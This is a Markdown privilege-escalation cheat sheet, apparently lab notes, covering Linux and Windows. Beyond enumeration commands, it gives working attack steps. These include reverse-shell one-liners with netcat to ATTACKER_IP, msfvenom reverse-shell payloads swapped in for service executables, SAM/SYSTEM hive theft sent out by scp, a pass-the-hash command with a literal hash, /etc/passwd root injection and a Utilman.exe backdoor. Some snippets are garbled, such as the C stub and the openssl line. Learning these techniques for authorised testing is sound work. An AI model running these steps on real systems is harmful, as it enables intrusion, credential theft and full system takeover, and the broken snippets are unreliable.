# Privilage Escalation Handbook
### Includes Linux and Windows

# Linux Privilage Escalation

## Useful Paths and Commands for Enumeration

< /proc/version > `provides information about the target system processes.`
 
< /etc/issues > `This file usually contains some information about the operating system but can easily be customized or changes.`

< hostname >
  - hostname

< uname >
  - uname -a `for all information`
    - Kernel Name	-s
    - Kernel Release	-r
    - Kernel Version*	-v
    - Network Node Name (Hostname)	-n
    - Machine architecture	-m
    - Processor architecture	-p
    - Hardware Platform (OS architecture)	-i
    - Operating System	-o
 
< ps > `This command provides a few useful options.`
  - ps -A: `View all running processes`
  - ps axjf: `View process tree (see the tree formation until ps axjf is run below)`
  - ps aux: `The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.`
 
< env >
  - show environmental variables.
  - The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
 
< sudo -l >
  - The target system may be configured to allow users to run some (or all) commands with root privileges.
 
< history >
  - can give us some idea about the target system

< netstat >
  - netstat -a: shows all listening ports and established connections.
  - netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
  - netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
  - netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.
  - netstat -tp: list connections with the service name and PID information.
  - netstat -i: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

< find >
  - find . -name flag1.txt: `find the file named “flag1.txt” in the current directory`
  - find /home -name flag1.txt: `find the file names “flag1.txt” in the /home directory`
  - find / -type d -name config: `find the directory named config under “/”`
  - find / -type f -perm 0777: `find files with the 777 permissions (files readable, writable, and executable by all users)`
  - find / -perm a=x: `find executable files`
  - find /home -user frank: `find all files for user “frank” under “/home”`
  - find / -mtime 10: `find files that were modified in the last 10 days`
  - find / -atime 10: `find files that were accessed in the last 10 day`
  - find / -cmin -60: `find files changed within the last hour (60 minutes)`
  - find / -amin -60: `find files accesses within the last hour (60 minutes)`
  - find / -size 50M: `find files with a 50 MB size`
  - find / -writable -type d 2>/dev/null: `Find world-writeable folders`
  - find / -perm -222 -type d 2>/dev/null: `Find world-writeable folders`
  - find / -perm -o w -type d 2>/dev/null: `Find world-writeable folders`
  - find / -name perl*
  - find / -name python*
  - find / -name gcc*
  - find / -perm -u=s -type f 2>/dev/null: `Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.`
  - find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null `for more info on files with SUID set` 
 
## Automated Enumeration Tools

  - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
  - LinEnum: https://github.com/rebootuser/LinEnum
  - LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
  - Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
  - Linux Priv Checker: https://github.com/linted/linuxprivchecker

## Privilege Escalation: Kernel Exploits

  - Find version of system
  - Exploit-db: https://www.exploit-db.com
  - linux kernel: https://www.linuxkernelcves.com/cves
  - Google: https://www.google.com
  - Searchsploit
  
## Privilege Escalation: Sudo

  - sudo -l: `Check root privilages`
  - GTFObins: https://gtfobins.github.io/

## Privilege Escalation: SUID

  - find / -type f -perm -04000 -ls 2>/dev/null: `list files that have SUID or SGID bits set.`
  - GTFObins: https://gtfobins.github.io/
- *If you can view /etc/shadow and /etc/passwd, can copy to attacker machine and use JohnTheRipper to find credentials*
  - unshadow passwd.txt shadow.txt > passwords.txt
- *If you can write to /etc/passwd*
  - openssl passwd -1 salt THM password1
  - add "root:/bin/bash" to end of user in /etc/passwd

## Privilege Escalation: Capabilities

  - getcap -r / 2>/dev/null: `list enabled capabilities.`
  - GTFObins: https://gtfobins.github.io/

## Privilege Escalation: Cron Jobs

  - /etc/crontab: `read the file keeping system-wide cron jobs`
- *See if any files can be edited, to run a payload or start a reverse shell*

## Privilege Escalation: PATH

  - echo $PATH: `Show the PATH variable`
  1. What folders are located under $PATH
  2. Does your current user have write privileges for any of these folders?
  3. Can you modify $PATH?
  4. Is there a script/application you can start that will be affected by this vulnerability?
---------------------------
  path_exp.c:

  #include <unistd.h>
  void main()
  {
  setuid(0);
  setgid(0);
  system(thm); `any binary that will run /bin/bash`
  }
---------------------------

  - gcc path_exp.c -o path -w `compile the C script`
  - chmod u+s path
  - find / -writable 2>/dev/null: `search for writable folders`
- *if able to, add path to the $PATH env variable*
  - export PATH=/tmp:$PATH `replace {/tmp} with the path to add`

## Privilege Escalation: NFS

  - /etc/exports `List NFS (Network File Sharing) configuration. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.`
- *On attacker machine*
  - showmount -e <target-IP>
  - mkdir /tmp/backuponAttackerMachine
  - mount -o rw <target-IP>:<NFS-file> /tmp/backuponAttackerMachine `eg: mount -o rw 10.10.10.19:/backups /tmp/backuponAttackerMachine.`
  - nano nfs.c `spawn a /bin/bash shell`
  - gcc nfs.c -o nfs -w `compile nfs.c`
  - chmod +s nfs  
  
# Windows Privilage Escalation

## Unattended Windows Installations
Usual files that may contain credentials:
  - C:\Unattend.xml
  - C:\Windows\Panther\Unattend.xml
  - C:\Windows\Panther\Unattend\Unattend.xml
  - C:\Windows\system32\sysprep.inf
  - C:\Windows\system32\sysprep\sysprep.xml

## Powershell History
  - type {user-profile}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  
## Saved Windows Credentials
  - cmdkey /list
  - runas /savecred /user:{user} cmd.exe
  
## IIS Configuration
  `We can find web.config in one of the following locations:`
  - C:\inetpub\wwwroot\web.config
  - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
- CMD:
  - type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
  - type C:\inetpub\wwwroot\web.config | findstr connectionString
- Powershell:
  - cat C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
  - cat C:\inetpub\wwwroot\web.config | findstr connectionString
  
## Retrieve Credentials from Software: PuTTY
  - reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s `search under the following registry key for ProxyPassword`
  
## Scheduled Tasks
  - schtasks `Lists all scheduled tasks`
  - schtasks /query /tn {TASK_NAME} /fo list /v  `List detailed information about the task specific`
  - icacls {Task to run} `To check the file permissions on the executable`
- *if able to modify the executable, you are able to execute scripts/reverse shell*
  - echo c:\tools\nc64.exe -e cmd.exe {ATTACKER_IP} {ATTACKER_LISTENING_PORT} > {Task to run} `eg: echo c:\tools\nc64.exe -e cmd.exe 10.10.10.18 4444 > C:\tasks\schtask.bat`
  
## AlwaysInstallElevated
- *Requires these two values to be set*
  - reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
  - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
- *Use msfvenom to generate a malicious installer*
  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
  - msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

## Insecure Permissions on Service Executable
  - sc qc {taskname} `sc qc WindowsScheduler`
  - icacls {path} `check permissions, eg: icacls C:\PROGRA~2\SYSTEM~1\WService.exe`
- *if able to edit the folder content/file*
- *On attacker machine*
  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
- *on target machine*
  - *move the payload from attacker machine to the target machine*
  - move WService.exe WService.exe.bkp `move legitimate .exe to .bkp`
  - move C:\Users\thm-unpriv\rev-svc.exe WService.exe `move payload to legitmate location with same name`
  - icacls WService.exe /grant Everyone:F `grant permissions to the payload to everything`
- *on attacker machine*
  - nc -lnvp {PORT} `start listener`
- *on target machine*
  - sc stop windowsscheduler
  - sc start windowsscheduler `restart service to get reverse shell`
  
## Unquoted Service Paths
- *CORRECT - "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service*
- *WRONG - C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe*
  - *Windows will run*
  - "C:\\MyPrograms\\Disk.exe" first
  - "C:\\MyPrograms\\Disk Sorter.exe" second
  - "C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe" third
- icacls {path} `to check ability to edit/add payload to the path`
- *on attacker machine*
  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
  - transfer to target machine
- *on target machine*
  - move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe 
  - icacls C:\MyPrograms\Disk.exe /grant Everyone:F
  - sc stop "disk sorter enterprise"
  - sc start "disk sorter enterprise"
- "on attacker machine"
  - nc -lnvp {PORT} `start listener`
  
## Insecure Service Permissions
  - accesschk64.exe -qlc {service} `check service permissions`
- *on attacker machine*
  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
  - transfer to target machine
  - start listener
- *on target machine*
  - icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F `grant permissions to your payload`
  - sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem `change the service's associated executable and account` 
  - sc stop THMservice
  - sc start THMservice

## SeBackup / SeRestore
- *When a certain user has permissions to perform backups from a system without having full administrative privileges*
  - whoami /priv `check our privileges`
    - SeBackupPrivilege
    - SeRestorePrivilege
- *To backup the SAM and SYSTEM hashes, we can use the following commands:*
  - reg save hklm\system {path to save to} `eg: reg save hklm\system C:\Users\THMBackup\system.hive`
  - reg save hklm\sam {path to save to} `eg: reg save hklm\sam C:\Users\THMBackup\sam.hive`
  - scp {system.hive} {attacker@attacker-ip}
  - scp {sam.hive} {attacker@attacker-ip}
- *on attacker target*
  - impacket tools: https://github.com/SecureAuthCorp/impacket
  - /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
  - /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP `Pass the hash attack`
  
## SeTakeOwnership
- *SeTakeOwnership privilege allows a user to take ownership of any object on the system, can hijack objects*
  - whoami /priv
    - SeTakeOwnershipPrivilege
  - Case study: Utilman.exe
    - takeown /f C:\Windows\System32\Utilman.exe `taking ownership from `
    - icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
    - C:\Windows\System32\> copy cmd.exe utilman.exe
    - Start > Lock Screen > Ease of Access
  
## SeImpersonate / SeAssignPrimaryToken
  - Rougepotato: https://github.com/antonioCoco/RoguePotato 
  `Only works if DCOM is enabled on the target Machine, use "PrintSpoofer" as alternative https://github.com/itm4n/PrintSpoofer`
- *on attacker machine*
  - sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
  - nc -lnvp 4444
- *on target machine*
  - RoguePotato.exe -r ATTACKER_IP -e "nc64 -e cmd.exe ATTACKER_IP 4448" -l 9999
  
 - PrintSpoofer: https://github.com/dievus/printspoofer / https://github.com/itm4n/PrintSpoofer
  - PrintSpoofer.exe -i -c cmd
  
## Tools of the trade
  - WinPEAS https://github.com/carlospolop/PEASS-ng `uncover privilege escalation paths`
    - winpeas.exe > outputfile.txt
  - PrivescCheck https://github.com/itm4n/PrivescCheck
      PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
      PS C:\> . .\PrivescCheck.ps1
      PS C:\> Invoke-PrivescCheck
  - WES-NG: Windows Exploit Suggester - Next Generation https://github.com/bitsadmin/wesng
    - *on target machine*
      - systeminfo > systeminfo.txt
      - transfer to attacker machine
    - *on attacker machine*
      - wes.py systeminfo.txt
  - Metasploit
    - *if attacker has a metapreter shell*
    - can use metasploit's "multi/recon/local_exploit_suggester" module to check for vulnerabilities

## Additional Tools
  - PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  - Priv2Admin https://github.com/gtworek/Priv2Admin
  - RogueWinRM https://github.com/antonioCoco/RogueWinRM
  - Potatos https://jlajara.gitlab.io/Potatoes_Windows_Privesc
  - Decoder Cloud https://decoder.cloud
  - Hacktricks https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
  - TokenKidnapping https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
  
  
